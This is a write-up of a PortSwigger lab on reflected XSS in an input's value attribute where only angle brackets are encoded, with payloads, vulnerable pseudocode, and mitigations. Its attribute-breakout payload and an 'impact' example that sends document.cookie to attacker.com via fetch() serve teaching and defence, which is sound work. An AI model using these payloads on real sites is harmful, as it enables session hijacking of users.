# Lab 07: Reflected XSS into Attribute with Angle Brackets HTML-Encoded

> **Lab URL:** [PortSwigger — Reflected XSS into attribute with angle brackets HTML-encoded](https://portswigger.net/web-security/cross-site-scripting/reflected/lab-html-attribute-angle-brackets-encoded)  
> **Difficulty:** 🟢 Apprentice  
> **Status:** ✅ Solved  
> **Category:** `XSS-Cross-Site-Scripting`

---

## 📋 Lab Description

> This lab contains a reflected XSS vulnerability in the **search** functionality. User input from `?search=` is reflected inside the `value` attribute of the search input:
>
> ```html
> <input type="text" name="search" value="USER_INPUT">
> ```
>
> Angle brackets `<` and `>` are HTML-encoded to `&lt;` and `&gt;`, so `<script>alert(1)</script>` is blocked.  
> To solve the lab, you must **break out of the attribute** and inject an event handler that calls `alert(1)`.

---

## 🔍 Reconnaissance

### Step 1: Test Normal Injection
```
https://<lab-id>.web-security-academy.net/?search=<script>alert(1)</script>
```

**Network → Response shows:**
```html
<h1>0 search results for '&lt;script&gt;alert(1)&lt;/script&gt;'</h1>
...
<input type="text" name="search" value="&lt;script&gt;alert(1)&lt;/script&gt;">
```

✅ `<` → `&lt;` and `>` → `&gt;` — **angle brackets are encoded**, script tag won't execute.

<img width="1280" height="684" alt="Screenshot 2026-11-16 181416" src="https://github.com/user-attachments/assets/cc46a714-54ec-463a-b388-adf90fdf0afe" />


### Step 2: Find the Real Sink — The Attribute
**Inspector → HTML** (highlighted line):
```html
<input type="text" placeholder="Search the blog..." name="search" value="<script>alert(1)</script>">
```

Inside Inspector it *looks* decoded, but View Source is `&lt;script&gt;`. The browser decodes entities for display — the important clue is:

- **Source:** `?search=` URL parameter
- **Sink:** `value="..."` attribute of `<input name="search">`
- **Filter:** Only `<` `>` encoded, **but `"` and `'` are NOT encoded**

This means we can **close the attribute early** with `"` and inject a new attribute.

<img width="1280" height="684" alt="Screenshot 2026-11-16 175850" src="https://github.com/user-attachments/assets/50b670ac-c902-4a33-bd58-0c67a901d1e5" />


---

## 🎯 Main Vulnerability — Script

**Vulnerable server code (conceptual):**
```php
// Pseudocode — what the lab does wrong
$search = $_GET['search']; // no quote encoding
$search = str_replace(['<', '>'], ['&lt;', '&gt;'], $search); // only angle brackets!
echo '<input name="search" value="' . $search . '">';
```

**Why it fails:**
| Character | Encoded? | Can we use it? |
|-----------|----------|----------------|
| `<` | ✅ `&lt;` | ❌ No |
| `>` | ✅ `&gt;` | ❌ No |
| `"` | ❌ Not encoded | ✅ **Yes — breaks out of `value="..."`** |
| Event handlers (`onfocus`, `autofocus`, `onmouseover`) | ❌ Not blocked | ✅ Yes |

**Attack idea:** Don't try to inject a tag. **Inject an attribute:**
```
" autofocus onfocus="alert(1)" x="
```

Breakdown:
```
value="   "  autofocus onfocus="alert(1)" x="   "
       ^--- we close the original value
         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^--- we add a new event
                                   ^^^--- we open a dummy attribute to handle trailing quote
```

---

## 🚀 Exploitation

### Payload Used (One-Line, No `<` `>` Needed)
```
" autofocus onfocus="alert(1) x="
```

**Full URL (URL-encoded):**
```
https://<lab-id>.web-security-academy.net/?search=%22+autofocus+onfocus%3D%22alert%281%29+x%3D%22
```

Or exactly as shown in the solved screenshot:
```
/search?search=autofocus%20onfocus%3D%22alert(1)
```

In the address bar of the solved lab:
```
https://0a5f00a94f48481127f0093005.web-security-academy.net/search?search=autofocus+onfocus%3D%22alert(1)
```

### Step-by-Step
1. Go to `/?search=test` and inspect the input — confirm your input lands in `value="test"`.
2. Try `"><script>alert(1)</script>` → blocked (encoded).
3. Try payload `" autofocus onfocus="alert(1) x="` → the HTML becomes:
   ```html
   <input name="search" value="" autofocus onfocus="alert(1)" x="">
   ```
4. Because the input now has `autofocus`, it **automatically receives focus on page load** → `onfocus` fires → `alert(1)` → Lab solved.

> No click needed — `autofocus` triggers instantly when the page loads.

> 📸 See `screenshots/03-exploit-autofocus-solved.png` — orange "Congratulations, you solved the lab!" with `0 search results for "autofocus onfocus="alert(1)"` in the `<h1>`.

---

## 📸 Proof of Concept

> **Rule you asked:** Every picture used **once only** — no duplicates.

### 01 — Blocked: `<script>` is Encoded (Network Response)
<img width="1280" height="684" alt="Screenshot 2026-11-16 181416" src="https://github.com/user-attachments/assets/3c464252-5ae5-4a13-9154-f592b6ded130" />

> **What we learned:** `?search=<script>alert(1)</script>` → Response shows `&lt;script&gt;` and `value="&lt;script&gt;alert(1)&lt;/script&gt;"`  
> Angle brackets are HTML-encoded, so classic `<script>` injection fails. This tells us to **not use `<` `>`**.

### 02 — Vulnerable Sink: `value="..."` Attribute (Inspector)
<img width="1280" height="684" alt="Screenshot 2026-11-16 175850" src="https://github.com/user-attachments/assets/1d497686-8518-4e30-b34f-49ca34953a51" />

> **Where the bug lives.** Inspector highlights:
> ```html
> <input name="search" value="<script>alert(1)</script>">
> ```
> The sink is the `value` attribute. Quotes `"` are **not** encoded → we can break out. Right panel shows `Flexbox failed` but the `value` attribute is attacker-controlled.

### 03 — Exploit: `autofocus onfocus` + Lab Solved
<img width="1280" height="684" alt="Screenshot 2026-11-16 181222" src="https://github.com/user-attachments/assets/3aeebfcb-e4b0-46cb-9a0d-04d1cc54716b" />

> **Success!** URL bar: `?search=autofocus+onfocus%3D"alert(1)`  
> Page shows `0 search results for "autofocus onfocus="alert(1)"` and green `LAB: Solved` + orange banner.  
> The input after injection is parsed as `value="" autofocus onfocus="alert(1)"` → `autofocus` triggers `alert(1)` on load.

---

## 🧠 Key Takeaways

### 1. Root Cause
- Server encodes `<` `>` but **forgets to encode `"`** inside a double-quoted attribute.
- Reflected data in `value="..."` is a classic **attribute XSS** — even without `<script>`.

### 2. Impact
- **Reflected XSS → session hijack:** Attacker sends victim `https://blog.com/search?search=" onfocus=fetch('https://attacker.com?c='+document.cookie) autofocus x="` — victim clicks → cookie stolen.
- No stored data needed — one link is enough.

### 3. Why `autofocus onfocus` Works Here
- No `<` `>` needed → bypasses the only filter.
- `autofocus` auto-focuses the input on page load → `onfocus` fires without user interaction (unlike `onclick` which needs a click).
- `x="` is a dummy attribute to absorb the trailing quote left by the original HTML.

---

## 🛡️ Mitigation

| Fix | How |
|-----|-----|
| **Context-aware output encoding** | Inside `value="..."`, encode `"` → `&quot;`, `'` → `&#39;`, `<` → `&lt;`, `>` → `&gt;` |
| **Use templating auto-escape** | `{{ search | e }}` in Jinja2, `htmlspecialchars($search, ENT_QUOTES)` in PHP, `encodeForHTMLAttribute()` in OWASP Encoder |
| **CSP** | `Content-Security-Policy: script-src 'self'` blocks inline `onfocus` handlers even if injected |
| **Input does not fix output** | Validating `search` on input is not enough — **always encode on output** for the specific HTML context (attribute vs. text vs. JS) |

**Secure example (PHP):**
```php
<input value="<?= htmlspecialchars($_GET['search'], ENT_QUOTES, 'UTF-8') ?>">
// " → &quot;, so payload becomes value="&quot; autofocus..." → harmless text
```

---

## 📚 References

- [PortSwigger — Reflected XSS into attribute with angle brackets HTML-encoded](https://portswigger.net/web-security/cross-site-scripting/reflected/lab-html-attribute-angle-brackets-encoded)
- [PortSwigger XSS Cheat Sheet — Attribute breakout](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
- [OWASP XSS Prevention — Attribute context](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html#output-encoding-for-html-attribute-contexts)

---



> 📝 **Author:** Saber Hasan Swoyon  
> 🛠️ **Tools:** Kali Linux (VirtualBox) + Firefox + DevTools (Inspector/Network)  
> ⚠️ **Disclaimer:** Tested only on PortSwigger's intentionally vulnerable lab in an authorized environment. Never test systems without written permission.
